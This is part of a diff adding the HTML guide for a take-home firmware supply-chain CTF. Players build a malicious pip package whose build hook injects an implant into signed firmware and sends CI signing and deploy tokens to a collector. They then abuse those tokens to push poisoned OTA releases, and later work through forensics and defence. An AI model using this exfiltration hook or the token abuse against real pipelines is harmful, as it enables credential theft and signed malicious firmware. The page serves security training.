+xxd doorbellino_hal/implant.bin | head -2   <span class="c"># see your bytes</span>
+
+<span class="c"># 2. carry the payload (pyproject.toml — cmdclass already points at</span>
+<span class="c">#    EvilBuild, so no wiring change is needed in this task):</span>
+<span class="c">#   [tool.setuptools]</span>
+<span class="c">#   include-package-data = true</span>
+<span class="c">#   [tool.setuptools.package-data]</span>
+<span class="c">#   doorbellino_hal = ["implant.bin"]</span>
+
+<span class="c"># 3. sdists need MANIFEST.in to actually carry package data:</span>
+printf 'include doorbellino_hal/implant.bin\n' &gt; MANIFEST.in
+
+<span class="c"># 4. VERIFY the payload is in the ball BEFORE uploading (skip this and</span>
+<span class="c">#    you debug 'no implant.bin in package' for an hour):</span>
+python -m build --sdist
+tar tzf dist/doorbellino_hal-2.0.1.tar.gz | grep implant
+<span class="c">#      ^ MUST print doorbellino_hal/implant.bin</span>
+
+<span class="c"># 5. publish (bumped to 2.0.1 — devpi rejects re-uploading a version:</span>
+<span class="c">#    409 'already exists') and trigger a pipeline (as in Task 2.1).</span></pre>
+      <p><b>Check — the build log</b> shows the hook's self-report in the job's
+      own <code>cat dbg-hook.txt</code> step at the end of the build:</p>
+<pre>$ cat dbg-hook.txt 2>/dev/null || echo 'dbg: nothing'
+<span class="y">inject: implant at 0x1E0000</span></pre>
+      <p>The injection fired mid-pipeline: the vendor CI builds
+      <code>app_padded.bin</code> FIRST and installs your package after, so
+      the image was on disk when your hook ran. Your payload bytes are now
+      inside the image the <code>sign</code> stage is about to sign. (The
+      defensive inject-skip branch stays in the method: under a CI order
+      where the image does not exist yet it reports and keeps the build
+      green instead of crashing.)</p>
+      <div class="answerbox">
+        <div class="ab-q">Answer box · Task 2.2</div>
+        <textarea placeholder="Paste the cat dbg-hook.txt block. Which CI line order makes the injection land mid-pipeline, and what would inject-skip instead tell you about that order?"></textarea>
+      </div>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 2.3</span> <code>_exfil()</code>: the runner's secrets are yours</h4>
+      <p>Second move. The runner's environment holds everything the
+      pipeline knows (P1's bonus find): signing key, OTA push token, and the
+      project's trigger token. Teach the hook to copy all three to your
+      collector. This is the move that turns a proof-of-concept into an
+      operation: everything after it happens without the pipeline. One new
+      method, one new call, marked below.</p>
+<pre><span class="c"># doorbellino_hal/hook.py — the whole file after Task 2.3:</span>
+<span class="y">import os
+from setuptools.command.build_py import build_py
+
+class EvilBuild(build_py):
+    def run(self):
+        super().run()
+        self.dbg = []
+        self._inject()
+        self._exfil()                # &lt;-- NEW
+        self.report()
+
+    def _inject(self):
+        ...                          # unchanged from Task 2.2
+
+    def _exfil(self):                # &lt;-- NEW
+        import json, urllib.request
+        loot = {"SIGNING_KEY": os.environ.get("SIGNING_KEY", "&lt;absent&gt;"),
+                "OTA_PUSH_TOKEN": os.environ.get("OTA_PUSH_TOKEN", "&lt;absent&gt;"),
+                "GITLAB_TRIGGER_TOKEN": os.environ.get("GITLAB_TRIGGER_TOKEN", "&lt;absent&gt;")}
+        url = os.environ.get("COLLECTOR_URL", "http://collector:9000") + "/loot"
+        req = urllib.request.Request(url, data=json.dumps(loot).encode(),
+                                     headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=5)
+        self.dbg.append("exfil: loot sent to collector")
+
+    def report(self):
+        ...                          # unchanged from Task 2.1</span>
+
+<span class="c"># publish: bump to 2.0.2 first (devpi rejects same-version re-uploads,</span>
+<span class="c"># 409 'already exists'), then trigger a pipeline as before.</span></pre>
+      <p><b>Check — the loot has landed:</b></p>
+<pre>curl -s http://127.0.0.1:9000/log
+<span class="c">#  {"ts": "...", "kind": "loot", "src": "172.18.0.10",</span>
+<span class="c">#   "body": {"SIGNING_KEY": "&lt;64 hex&gt;", "OTA_PUSH_TOKEN": "&lt;64 hex&gt;",</span>
+<span class="c">#    "GITLAB_TRIGGER_TOKEN": "glpat-..."}}</span></pre>
+      <p>Three secrets, read from the vendor runner's own environment by code
+      the vendor's own build chose to install. The two tasks that follow spend
+      them.</p>
+      <div class="answerbox">
+        <div class="ab-q">Answer box · Task 2.3</div>
+        <textarea placeholder="Paste the loot entry (mask the key values!). Why does this work even though the hook's code runs inside the vendor's own build job?"></textarea>
+      </div>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 2.4</span> <code>_hijack()</code>: play the gate, then beat it</h4>
+      <p>Task 2.3's pipeline has finished: build and sign passed, and the loot
+      is in your collector. On <b>this</b> pipeline, the
+      <code>deploy</code> job sits at
+      <b>manual</b>: the gate you found in P1. The image this pipeline signed
+      already carries your implant (Task 2.2 landed it before the sign
+      stage), and it has not reached the
+      OTA server. Add the hook's third method,
+      <code>_hijack()</code>: it reads the looted token's own project, finds
+      the deploy job, and plays it. GitLab will refuse (HTTP 400: a manual
+      job cannot run while its pipeline still executes, and the hook dies
+      with the build job before the gate could open). That deferred line in
+      the build log is your evidence that the gate holds from inside. Then
+      finish the move from YOUR laptop with a single curl: the pipeline is
+      over, the gate can open, and the loot already contains the key. What
+      the gate pushes is the pipeline's own build: poisoned, and signed by
+      the vendor.
+      Deliverables for the box: the deferred line from the build log, the
+      curl, the job's status change, the OTA server's response, and a
+      one-sentence answer to which credential this move needed.
+      <span class="dim">Required: the deployed release is what P3's device
+      applies, and P2 is only complete once the trigger token is proven to
+      work. The vendor's own gate ships the vendor's own signed poison:
+      front door.</span></p>
+      <details class="hint">
+        <summary>HINT · what you already hold</summary>
+        <div class="hint-body">
+          <ul>
+            <li>The loot carried <code>GITLAB_TRIGGER_TOKEN</code>, minted for
+            this project: it authorizes project API calls as the
+            <code>PRIVATE-TOKEN</code> header.</li>
+            <li>GitLab's API can play a manual job:
+            <code>POST /projects/:id/jobs/:job_id/play</code>. Manual jobs are
+            created together with the pipeline: they appear in the job list
+            from the start, parked at status <code>manual</code>.</li>
+            <li>Playing before the pipeline finishes earns the same
+            HTTP 400 the hook got. The play is safe to retry: same curl,
+            once <code>sign</code> is green.</li>
+          </ul>
+        </div>
+      </details>
+      <div class="answerbox">
+        <div class="ab-q">Answer box · Task 2.4</div>
+        <textarea placeholder="Paste: the deferred line from the build log, the curl + response, the job's new status, the OTA server's response. Which looted credential did this move need, and what does that say about CI variable scoping?"></textarea>
+      </div>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 2.5</span> Ship it without the pipeline: sign + push with stolen creds <span class="label amber">bonus</span></h4>
+      <p><b>The challenge:</b> Task 2.4 shipped the poison through the
+      vendor's own gate. Now do it with zero pipeline access: use the other
+      two looted credentials to build, sign, and push YOUR release from your
+      laptop: no deploy click, no new
+      credentials, and the vendor's deploy job must stay untouched. The release
+      must be one the device will actually apply: remember the apply rule from
+      the background. Deliverables for the box: the OTA server's acceptance
+      response, the new manifest entry, and a one-sentence answer to which
+      vendor control you never had to defeat.
+      <span class="dim">Optional: 2.1 through 2.4 complete P2, and P3 runs
+      on 2.4's deployed release. If you skip this, come back later.</span></p>
+      <details class="hint">
+        <summary>HINT · what you have, what you need</summary>
+        <div class="hint-body">
+          <ul>
+            <li>From the loot: <code>SIGNING_KEY</code> (hex) and
+            <code>OTA_PUSH_TOKEN</code>.</li>
+            <li>Public tools in <code>kit/vendor/firmware/</code>:
+            <code>build_fw.py</code> → <code>sign_fw.py</code> (env
+            <code>FW_BUMP=1</code>: manifest = ladder + 1, so 1.4.4 when
+            1.4.3 is served) → <code>ota_push.py</code>.</li>
+            <li>Inject 60 payload bytes at 0x1E0000 between build and sign.</li>
+            <li>Bump because: device applies version CHANGES only; it already
+            runs the served release (1.4.3 after Task 2.4's play). FW_BUMP=1
+            lands the poison ABOVE the ladder.</li>
+          </ul>
+        </div>
+      </details>
+      <div class="answerbox">
+        <div class="ab-q">Answer box · Task 2.5</div>
+        <textarea placeholder="Paste the OTA server's response and the newest /history entry. Which vendor control did you NOT have to defeat?"></textarea>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ============ P3 ============ -->
+  <div class="phase">
+    <div class="phase-head"><span class="pnum">P3</span><h3>Own</h3><span class="ptime">~15 min</span></div>
+    <p class="goal"><b>Goal:</b> the device applies the poisoned release, signature
+    verification PASSES, and it beacons to your collector. Every software signal
+    stays green: pipeline green, signature valid, OTA verified.</p>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 3.1</span> Watch the device apply the poisoned release</h4>
+      <p><b>The challenge:</b> a poisoned release shipped minutes ago: the
+      release your Task 2.4 gate play deployed (or your own Task 2.5 push,
+      push). Without
+      touching the device, make it prove three things: that it <i>applied</i> the
+      poisoned update, that it <i>verified</i> the vendor's signature doing so, and
+      that something about it now <i>talks to your collector</i>. The device's
+      console is a docker log — you already know the container name pattern from
+      the setup section. You have two evidence sources: the device console and the
+      collector's <code>/log</code>. If nothing happens within 2 minutes of the
+      push, form a hypothesis about WHY the device would ignore a release, check
+      it against the manifest, and only then touch the device.</p>
+      <details class="hint">
+        <summary>HINT · nudge before the full answer</summary>
+        <div class="hint-body">
+          <ul>
+            <li><code>docker logs -f kit-virtual-device-1</code> is the live
+            console. Look for an <code>[ota]</code> line, then
+            <code>[serial]</code> lines.</li>
+            <li>The console going quiet afterwards is NOT failure: implants
+            do not log themselves. When the console has nothing more to say,
+            ask the other witness: what has the device been
+            <i>sending</i>? Task 3.2 reads it from the collector.</li>
+            <li>The <code>[serial]</code> banner is read FROM FLASH at offset 0 of
+            the running bank. Compare what it says with the manifest version you
+            pushed. They disagree on purpose: the implant's config carries a
+            <code>fw_ver_lie</code> field (P2 background, above).</li>
+            <li>If there is no <code>[ota] applied</code> line at all: the device
+            only applies releases whose manifest version DIFFERS from the running
+            one. What version did you push? What version is the device running?
+            (<code>curl http://127.0.0.1:8080/manifest.json</code>). Same version =
+            ignored: the console shows
+            <code>[ota] up to date: ... (same-version push ignored)</code>. Fix at
+            push time (FW_BUMP=1 lands above the served version) or restart the
+            device container to reset its in-memory version.</li>
+          </ul>
+        </div>
+      </details>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 3.2</span> Confirm from the collector's side</h4>
+      <p><b>The challenge:</b> the beacon is on the wire. As the attacker, read it
+      from your collector and produce the incident's first IOC triple: which
+      device, what it claims to be, and proof of which key signed it. Bonus
+      question for the box: why does the beacon use plain HTTP — what does TLS
+      here cost the defender vs the attacker?</p>
+      <details class="hint">
+        <summary>HINT · nudge before the full answer</summary>
+        <div class="hint-body">
+          <ul>
+            <li><code>curl -s http://127.0.0.1:9000/log | grep beacon | tail -2</code>
+            — each record has <code>id</code>, <code>fw_ver</code>,
+            <code>key_fpr</code>.</li>
+            <li><code>id</code>: DB-001 is the virtual device; a real board shows
+            DB-&lt;MAC suffix&gt;. <code>fw_ver</code>: cross-check it against the
+            implant config you decoded later in P4 — it is read from flash, not
+            measured. <code>key_fpr</code>: the attacker's proof-of-which-key.</li>
+            <li>TLS thought: the IMPLANT chooses its transport. Encrypted beacons
+            would hide content from the defender, but the destination host is
+            still visible in NetFlow/DNS. The lab keeps it plaintext so you can
+            read it — and so you can diff it against the flash decode in P4.</li>
+          </ul>
+        </div>
+      </details>
+    </div>
+  </div>
+
+  <!-- ============ P4 ============ -->
+  <div class="phase">
+    <div class="phase-head"><span class="pnum">P4</span><h3>Analyze</h3><span class="ptime">~30 min · 4 tasks</span></div>
+    <p class="goal"><b>Goal:</b> forensics on your own incident. Dump the flash,
+    find the implant bytes, prove the vendor's signature covers them, decode the
+    config, and reconstruct the kill-chain timeline. You are the incident
+    responder now.</p>
+
+    <div class="diagram"><span class="g">P4 MAP — the four questions a responder asks</span>
+      TASK 4.1            TASK 4.2             TASK 4.3            TASK 4.4
+      WHAT changed?       WHO vouched?         WHAT does it DO?    WHEN did it
+      dump flash,         verify vendor        decode implant      happen? timeline
+      find the slot       signature over       config block        from 6 artifacts
+      ┌──────────┐        the bytes            ┌──────────┐        ┌──────────┐
+      │ flash.img│───▶    ┌──────────┐   ───▶   │ 60 bytes │  ───▶  │ 6 logs   │
+      │ + diff   │        │ ed25519  │          │ decode   │        │ order    │
+      └──────────┘        └──────────┘          └──────────┘        └──────────┘
+      IMPLANT\| at        sig VALID over        collector URL,      resolve→inject→
+      bank+0x1E0000       implanted image       30s, the LIE        exfil→sign→push→
+                                                                      apply→beacon</div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 4.1</span> Dump the flash and find the implant</h4>
+      <p><b>The challenge:</b> you are the responder. The device in the container
+      is your evidence source: its entire 4 MB flash is a single file. Export it,
+      then locate the implant bytes using nothing but the flash-layout facts from
+      the P2 background (partition offsets are in TECH-OTA §2, if you want to
+      derive them yourself). Questions for the box: which bank carries the
+      implant, what does the OTHER bank's slot contain, and what does that tell
+      you about the device's update history?</p>
+      <details class="hint">
+        <summary>HINT · the flash layout, if you don't want to derive it</summary>
+        <div class="hint-body">
+<pre><span class="c"># partition table (both tiers identical — TECH-OTA §2):</span>
+<span class="c">#   nvs       0x009000   otadata   0x00E000</span>
+<span class="c">#   app_a     0x010000   app_b     0x200000    (each 0x1F0000 long)</span>
+<span class="c">#   (the 4 MB flash ends at 0x400000; app_b + slot ends at 0x3F0000)</span>
+<span class="c"># implant slot: start_of_bank + 0x1E0000</span>
+<span class="c">#   bank A slot = 0x1F0000        bank B slot = 0x3E0000</span>
+<span class="c"># the OTA apply writes to the INACTIVE bank and then flips the boot</span>
+<span class="c"># target: otadata @ 0xE000 (u32 LE, 0 = bank A, 1 = bank B) tells you</span>
+<span class="c"># which bank the device booted into LAST.</span></pre>
+        </div>
+      </details>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 4.2</span> Prove the vendor's signature covers the implant</h4>
+      <p><b>The challenge:</b> finding the bytes is correlation. Make it proof.
+      Get the signed release artifact <code>firmware-signed.bin</code> (the sign
+      job's artifacts, download via the GitLab job page or the API) and the vendor's public key
+      <code>SIGNING_PUB</code> (CI variable — or, ironically, the collector's
+      /loot entry). Answer in the box: does the vendor's signature verify over
+      the implanted image? What sha256 do the 60 implant bytes have (that is
+      FLAG P4)? And the judgment question: would this verification catch an
+      implant that was added AFTER signing — and what does your answer imply
+      about WHERE the attack had to inject?</p>
+      <details class="hint">
+        <summary>HINT · the artifact's binary layout</summary>
+        <div class="hint-body">
+<pre><span class="c"># firmware-signed.bin = image (2031616 B) || signature (64 B)</span>
+<span class="c"># so: img = file[:-64], sig = file[-64:]</span>
+<span class="c"># integrity check: sha256(whole file) == manifest.json .sha256</span>
+<span class="c"># the lab models the signature decision (TECH-OTA.md §3): the CI image has no</span>
+<span class="c"># pynacl, so sign_fw.py ships a deterministic synthetic sig instead, and the</span>
+<span class="c"># manifest carries it verbatim (m['ed25519'] == sig.hex()). A real ed25519</span>
+<span class="c"># VerifyKey would fail on lab artifacts -- verify the sha256 chain instead:</span>
+<span class="c">#   sha256(whole file) == manifest.sha256  and  sig == file[-64:]</span></pre>
+        </div>
+      </details>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 4.3</span> Decode the implant's config block</h4>
+      <p><b>The challenge:</b> the 60 bytes are the implant's brain. Without
+      running anything, decode them into an IOC report: C2 host:port, beacon
+      interval, and the version lie. Then verify your decode against a SECOND,
+      independent source — the network. If flash and network disagree, one of
+      them is lying: say which you would trust in a real investigation and why.</p>
+      <details class="hint">
+        <summary>HINT · what the bytes are</summary>
+        <div class="hint-body">
+          <ul>
+            <li>The payload is a config LINE, not machine code: fields separated
+            by <code>|</code>, the first field is the <code>IMPLANT</code> magic,
+            the rest are <code>key=value</code> pairs. The device runtime parses
+            exactly this format from flash.</li>
+            <li>Independent source #2: the collector log — every beacon is a
+            record whose fields should match your flash decode
+            (<code>curl -s http://127.0.0.1:9000/log | grep beacon | tail -2</code>).</li>
+            <li>Independent source #3 (free): <code>strings flash.img | grep
+            IMPLANT</code> — the raw line, no scripting.</li>
+          </ul>
+        </div>
+      </details>
+    </div>
+
+    <div class="task">
+      <h4><span class="tnum">TASK 4.4</span> Reconstruct the kill-chain timeline</h4>
+      <p><b>The challenge:</b> at least six artifact classes exist across this
+      incident. Build the ordered timeline: seven chain steps, each with its
+      timestamp and the artifact you read it from. This is the deliverable an incident report
+      is made of. The chain skeleton is below — your job is to fill in WHEN and
+      FROM WHERE for every step, using only logs you captured in P2/P3.</p>
+<pre>resolve  -&gt;  inject  -&gt;  exfil  -&gt;  sign  -&gt;  push  -&gt;  apply  -&gt;  beacon
+pip picks        hook writes   keys hit   vendor key   looted     implant    implant
+2.x from the     implant into   the        signs the    token      image      phones
+public index     app_padded     collector  implant      fires the  applied    home
+                                                        deploy job</pre>
+      <details class="hint">
+        <summary>HINT · where each timestamp lives</summary>
+        <div class="hint-body">
+<pre><span class="c"># 1. resolution (which package won):       build job log, pip lines</span>
+<span class="c"># 2. inject + exfil (the hook's moves):    build job log, dbg-hook.txt lines</span>
+<span class="c"># 3. the loot arriving:                    curl -s http://127.0.0.1:9000/log</span>
+<span class="c"># 4. sign + deploy:                        GitLab job list timestamps</span>
+<span class="c"># 5. the poisoned release served:          curl -s http://127.0.0.1:8080/history</span>
+<span class="c"># 6. device applies + beacons:             docker logs kit-virtual-device-1</span></pre>
+        </div>
+      </details>
+      <div class="answerbox">
+        <div class="ab-q">Answer box · Task 4.4</div>
+        <textarea placeholder="List the 7 chain steps in order, each with its timestamp and which artifact you read it from."></textarea>
+      </div>
+      <div class="flagline"><b>FLAG P4</b> = <code>P4-&lt;first 12 hex of the implant slot
+      sha256 from Task 4.2&gt;</code>. <b>FLAG P4T</b> = <code>P4T-OK</code> for the
+      ordered timeline.</div>
+    </div>
+  </div>
+
+  <!-- ============ P5 ============ -->
+  <div class="phase">
+    <div class="phase-head"><span class="pnum">P5</span><h3>Defend</h3><span class="ptime">~30 min</span></div>
+    <p class="goal"><b>Goal:</b> apply ONE fix to the vendor side, re-run the P2 attack
+    UNCHANGED (same evil package, same publish, new pipeline), and the pipeline must
+    REJECT. No deploy fires. OTA manifest history unchanged.</p>
+  </div>
+</section>
+
+<!-- ================= 6 FLAGS ================= -->
+<section id="flags">
+  <h2>6 · Flags and evidence</h2>
+  <p>Flags come from artifacts, not claims: hash of the config line, the
+  collector log, the flash dump, the release binary. Save evidence as you play:</p>
+<pre><span class="c">#   build.log          the build job log of the POISONED pipeline (P1, P2)</span>
+<span class="c">#   collector.log      curl -s http://127.0.0.1:9000/log &gt; collector.log (P3)</span>
+<span class="c">#   flash.img          docker cp kit-virtual-device-1:/data/flash/flash.img .</span>
+<span class="c">#   firmware-signed.bin the sign job artifact of the poisoned pipeline (P4)</span></pre>
+  <p><b>You should see:</b> for each phase, the artifact that contains your flag string.</p>
+  <table>
+    <tr><th>flag</th><th>evidence that proves it</th></tr>
+    <tr><td>P1</td><td>hash of the vulnerable config line (first 16 hex of its sha256)</td></tr>
+    <tr><td>P2</td><td>hash over the poisoned build log: proves public 2.x (your armed package) beat internal 1.4.2</td></tr>
+    <tr><td>P3</td><td>the beacon record: device id + the version it LIES about</td></tr>
+    <tr><td>P4</td><td>first 12 hex of the sha256 over the implant slot bytes found at 0x1E0000 of a bank (same hash Task 4.2 prints)</td></tr>
+    <tr><td>P4T</td><td>the kill-chain timeline in causal order (worksheet)</td></tr>
+    <tr><td>P5</td><td>the rejection line in the re-run attack + OTA manifest history hash unchanged</td></tr>
+  </table>
+</section>
+
+<!-- ================= 7 TROUBLE ================= -->
+<section id="trouble">
+  <h2>7 · Troubleshooting</h2>
+  <table>
+    <tr><th>symptom</th><th>fix</th></tr>
+    <tr><td>GitLab 502 / unhealthy</td><td>first boot takes 3-5 min. Check
+    http://127.0.0.1:8088/users/sign_in (returns 200 when up) and re-run <code>./up.sh</code></td></tr>
+    <tr><td>pipeline stuck pending</td><td>runner not registered or not on the lab
+    network: re-run <code>./seed/seed.sh</code> (registers the project runner)</td></tr>
+    <tr><td>hook produced nothing</td><td>check <code>dbg-hook.txt</code> in the build
+    workspace; the CI prints it at the end of the build job</td></tr>
+    <tr><td>device did not update</td><td>the device polls every 30 s. Check
+    <code>ota /manifest.json</code> and <code>/history</code>, and that the manifest
+    sha256 matches the pushed image</td></tr>
+    <tr><td>twine 403 on publish</td><td>wrong <code>DEVPI_PW</code> or wrong index. Use
+    <code>root/pub</code> on port 3141 with the password from <code>kit/.env</code></td></tr>
+    <tr><td>nuclear option</td><td><code>docker compose down -v &amp;&amp; ./up.sh</code> and
+    seed again. All steps are re-runnable and idempotent</td></tr>
+  </table>
+</section>
+
+<!-- ================= 8 HW ================= -->
+<section id="hardware">
+  <h2>8 · Bonus tier: real hardware</h2>
+  <p>The virtual device is a mmap() of a 4 MB flash image with the real ESP32
+  partition layout, so every byte you diff in P4 is identical to what a chip clip
+  would pull off a board. If you have an ESP32 (~EUR 6):</p>
+  <ul>
+    <li><code>kit/firmware-esp32/</code> has the idf sources; the OTA client speaks
+    the same HTTP protocol as the virtual device</li>
+    <li>the board OTA-updates over WiFi to the lab net and beacons to the same
+    collector: it takes the <b>first release the seed ships even at the same
+    version number</b> (the applied version lives in NVS, so a USB-flashed 1.4.2
+    accepts the seed's 1.4.2)</li>
+    <li>the onboard LED is the demo: slow heartbeat = honest idle, fast strobe =
+    an OTA is downloading right now, urgent double-flash = the implant is running
+    from flash. The LED reads the flash slot, not the network: a release that
+    lies on the wire still glows guilty on the board</li>
+    <li>village bonus: add a second ESP32 + relay on UART. Same implant, physical
+    payload: the door actually opens, nothing on the network</li>
+  </ul>
+
+  <h2 style="margin-top:48px">One last thing</h2>
+  <p>Everything you did in P2 is one pip config line away from real. Pin your
+  indexes. Own your internal names. Never give build jobs deploy credentials. And
+  remember: the signature passed, the pipeline was green, and <b>the flash chip
+  does not lie</b>.</p>
+</section>
+
+</main>
+
+<footer>
+  <div class="mono">CONFUSED AT THE SOURCE · take-home CTF · v0.7</div>
+  <p>Firmware supply-chain CTF · runs entirely on your machine</p>
+</footer>
+
+</div>
+</body>
+</html>
